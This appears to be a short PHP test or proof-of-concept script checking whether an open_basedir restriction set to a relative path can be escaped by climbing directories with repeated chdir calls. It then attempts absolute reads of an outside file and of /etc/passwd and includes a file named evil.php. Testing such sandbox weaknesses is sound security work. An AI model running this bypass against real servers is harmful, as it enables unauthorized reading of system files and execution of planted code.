<?php
/* f49 receipt shape: -d open_basedir=jail:../ ; climb; absolute reads. */
$jail = '/tmp/f49/jail';
echo "PHP=" . PHP_VERSION . "\n";
echo "INI=" . ini_get('open_basedir') . "\n";
chdir($jail . '/deep/down/here');
echo "CWD0=" . getcwd() . "\n";
for ($n = 0; $n < 20; $n++) { @chdir('..'); }
echo "CWD=" . var_export(@getcwd(), true) . "\n";
$out = @file_get_contents('/tmp/f49/OUTSIDE.txt');
echo "OUTSIDE=" . var_export($out, true) . "\n";
$pw = @file_get_contents('/etc/passwd');
echo "PASSWD=" . var_export($pw ? substr($pw, 0, 30) : $pw, true) . "\n";
@include '/tmp/f49/evil.php';
echo "END\n";
